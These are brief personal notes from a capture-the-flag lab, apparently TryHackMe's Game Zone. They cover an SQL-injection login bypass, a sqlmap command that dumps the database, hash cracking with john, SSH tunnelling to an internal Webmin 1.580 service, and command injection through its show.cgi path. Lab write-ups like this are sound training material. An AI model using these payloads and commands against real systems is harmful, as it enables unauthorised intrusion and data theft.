# access
go to web
username ' or 1=1 -- -
* not sure about the extra dashes? 
intercept request with burp
save to file and run sqlmap
sqlmap -r burp_intercept.txt --dbms=mysql --dump
crack PW hash with john
get password as ---------
ssh and get user.txt

# enumerate
ss -tulpn (or --numeric-ports on netstat) and see 5 ports, listening local on 10000
use ssh tunnel to see internal web page ssh -L 8080:localhost:10000 agent47@10.10.240.73
should be able to scan through ssh tunnel? https://www.reddit.com/r/HowToHack/comments/6dg2ng/nmap_scanning_through_ssh_tunnel/
config file shows 1.580 version

# escalate
see the vuln for that version of webmin
look through script
see that I can navigate to a directory and run commands
eventually figure out I can either read root/root directly https://medium.com/@aniyazov2500/tryhackme-gamezone-1a5b13fbdf2a
or that I can run a script via http://localhost:8080/file/show.cgi/tmp/test.sh|

